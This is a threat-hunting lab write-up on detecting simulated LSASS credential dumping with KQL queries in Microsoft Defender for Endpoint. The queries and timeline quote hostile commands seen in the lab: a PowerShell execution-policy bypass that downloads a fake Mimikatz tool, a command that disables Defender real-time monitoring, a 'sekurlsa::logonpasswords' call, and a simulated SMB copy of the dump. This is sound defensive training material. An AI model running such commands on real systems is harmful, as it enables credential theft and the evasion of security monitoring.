# Threat Event: Credential Dumping via LSASS Access  
**Simulated Credential Theft Using PowerShell and Fake Mimikatz Tool**

![image](https://github.com/user-attachments/assets/47315c4e-f225-45ae-8ca9-a0850feb1e12)


- [Scenario Creation](https://github.com/aduragbemioo/Threat-Hunt-Scenario-Credential-Dumping-via-LSASS-Access/blob/main/scenario.md)

---
## Platforms and Tools Used

- Windows 10 Virtual Machine (Microsoft Azure)
- EDR Platform: Microsoft Defender for Endpoint
- Kusto Query Language (KQL)
- PowerShell                         
- mimi-sim.exe (Fake executable mimicking Mimikatz behavior)


---

## Senario

### 🚨 CISA Advisory and Internal Management Directive  
Due to a recent alert from CISA warning of increased attacker activity targeting the LSASS process for credential dumping using tools like **Mimikatz** and **ProcDump**, management directed a proactive hunt for related activity across endpoints.

---



---

## Investigation Steps

---

### 🔍 **1. Detection of Suspicious Tool Creation or Download**

```kusto
DeviceFileEvents
| where FileName has_any ("debug", "mimi", "procdump") 
| where FileName endswith ".exe"
| project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, ActionType
```
Found creation of mimi-sim.exe under a user profile on device ad-stig-impleme.
![image](https://github.com/user-attachments/assets/5a29e839-379c-41a3-85f9-77f6b8afb1b7)


🧠 2. Execution of Simulated Mimikatz with sekurlsa Argument

```kusto
DeviceProcessEvents
| where DeviceName == "ad-stig-impleme"
| where ProcessCommandLine has_any ("mimi-sim.exe", "sekurlsa")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```
The actual executable is fake, so it didn't run, but we see PowerShell initiating the command: `"powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/aduragbemioo/Threat-Hunt-Scenario-Credential-Dumping-via-LSASS-Access/refs/heads/main/mimi-sim.exe -OutFile C:\Users\vullab\Downloads\mimi-sim.exe`
![image](https://github.com/user-attachments/assets/321fb2e6-c432-43aa-993c-4823dd902bbe)



🗂️ 3. LSASS Dump File Creation Detection
What is LSASS Dumping?
Attackers dump the memory of the lsass.exe process to extract plaintext credentials. This is commonly used for:

- Privilege escalation
- Lateral movement
- Credential theft

```kusto
DeviceFileEvents
| where DeviceName == "ad-stig-impleme"
| where FileName =~ "lsass.dmp"
| where FolderPath has_any ("\\Temp\\", "\\AppData\\Local\\Temp\\", "\\Desktop\\")
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, ActionType
```
- The simulated script created a fake lsass.dmp on the `desktop` and `\AppData\Local\Temp` folders
- The event was logged after mimi-sim.exe was dropped.
![image](https://github.com/user-attachments/assets/a598ffa8-e292-4a14-a647-28b1d86c895d)

📤 4. Simulated Exfiltration to Remote Network
```kusto
DeviceNetworkEvents
| where DeviceName == "ad-stig-impleme"
| where InitiatingProcessFileName in~ ("powershell.exe", "cmd.exe", "wscript.exe", "cscript.exe", "ntoskrnl.exe")
| where RemotePort !in (80,443)
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, ActionType, RemoteIP, RemotePort, RemoteIPType, RemoteUrl
| order by Timestamp asc
```
- Simulated copy to a private IP (e.g., \\192.168.1.99\shared) caused network activity.
- No actual exfiltration occurred, but logs reflect the attempt.

![image](https://github.com/user-attachments/assets/cf7d5bcd-5814-4ade-8a7d-604c50f59fb8)


🛡️ 5. Defender Realtime Monitoring Tampering Attempt

```kusto
DeviceProcessEvents
| where DeviceName == "ad-stig-impleme"
| where ProcessCommandLine has "Set-MpPreference" and ProcessCommandLine has "DisableRealtimeMonitoring"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```
- PowerShell attempted to run: Set-MpPreference -DisableRealtimeMonitoring $true

![image](https://github.com/user-attachments/assets/6cdb4645-55aa-4782-912b-b603bfddd2f3)

- Defender logged the attempt, useful for detecting tampering efforts.


## Chronological Event Timeline

### 1. Suspicious File Drop

- **Timestamp:** 2025-06-25T19:15:18.3442829Z 
- **Event:** Dropped `mimi-sim.exe` into the Downloads directory via PowerShell.  
- **Folder Path:** Likely under `C:\Users\vullab\Downloads\mimi-sim.exe`  

---

### 2. Defender Tampering Attempt

- **Timestamp:** 2025-06-25T19:16:38.3626718Z
- **Event:** PowerShell attempted to disable Windows Defender’s Real-Time Protection.  
- **Command Line:** `Set-MpPreference -DisableRealtimeMonitoring $true`  

---

### 3. Simulated Credential Dump Execution

- **Timestamp:** 2025-06-25T19:56:37.7992988Z
- **Event:** Execution of fake Mimikatz logic via PowerShell.  
- **Command Line:** `powershell.exe -ExecutionPolicy Bypass -Command "sekurlsa::logonpasswords"`  

---

### 4. LSASS Memory Dump File Created

- **Timestamp:** 2025-06-25T19:16:43.2317559Z and 2025-06-25T23:26:21.5826554Z
- **Event:** Simulated creation of `lsass.dmp` representing a memory dump of LSASS.  
- **Path:** `C:\Users\vullab\AppData\Local\Temp\lsass.dmp` and `C:\Users\vullab\Desktop\lsass.dmp`  

---

### 5. Simulated Exfiltration Attempt

- **Timestamp:** 2025-06-25T19:17:04.3343329Z and 2025-06-25T19:17:05.4279126Z
- **Event:** PowerShell attempted to copy the dump file to a remote share over SMB.  
- **Remote IP:** `192.168.1.99` (simulated private IP for testing)  
- **Port:** SMB (445), SMB (139)

---

## Summary of Hunt Findings

A simulated credential dumping activity was conducted using a fake executable (`mimi-sim.exe`). The activity mimics techniques used by real attackers attempting to extract credentials from LSASS memory and exfiltrate the data. One device was identified with relevant indicators.

- **Affected Device**: `ad-stig-impleme`
- **Simulated Tools Used**: `mimi-sim.exe` and `PowerShell`
- **Key Behaviors Observed**:
  - Credential dump simulation using PowerShell
  - Fake LSASS memory dump creation
  - Simulated exfiltration to a private IP
  - Attempt to disable Windows Defender Real-Time Monitoring

---

## Response Taken

- Device `ad-stig-impleme` was **flagged for observation**; no real credentials were compromised.  
- Simulation logs were preserved for SOC detection rule validation.  
-Defender alerting was reviewed and confirmed to cover all key behaviors.



